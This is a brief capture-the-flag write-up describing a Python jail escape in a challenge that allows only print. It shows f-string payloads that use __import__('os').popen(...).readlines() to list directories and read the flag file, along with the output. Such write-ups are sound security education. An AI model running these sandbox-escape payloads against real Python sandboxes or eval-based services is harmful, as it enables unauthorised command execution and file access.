![[ml_pyjail_banner.png]]

![[ml_pyjail_print.png]]

this pyjail only supported the print command

and no other command worked

also i solved this challenge without downloading the zip file as there wasnt one when i completed it


to get code execution i tried to encapsulate a import in the python f-string

like this `__import__('os')` as it did not give an error message i knew it worked

i fuzzed for not usable functions like read() open() system() so i tried other ones like popen() that runs the command but does not directly send the result in the stdout

so to get the output i had to execute .read() that was not possible 

so i tried an alternative `readline()` and it worked!


```
>>print(f"{__import__('os').listdir('/home/pctf')}") 

['.dockerignore', 'MLjail', 'ReadME.md', 'docker-compose.yml', 'Dockerfile', 'entrypoint.sh', '.gitignore']

>>print(f"{__import__('os').listdir('/home/pctf/MLjail')}") 

['mlmodel', 'ReadME.md', 'app.py', 'requirements.txt', 'flag.txt', 'tags', 'training_data'] 

>>print(f"{__import__('os').popen('cat MLjail/flag.txt).readlines()}") 

Oops, something broke: f-string: unterminated string (<string>, line 1)

>>print(f"{__import__('os').popen('cat MLjail/flag.txt').readlines()}") 

['PCTF{M@chin3_1earning_d0_be_tR@nsformati0na1_1818726356}']
```
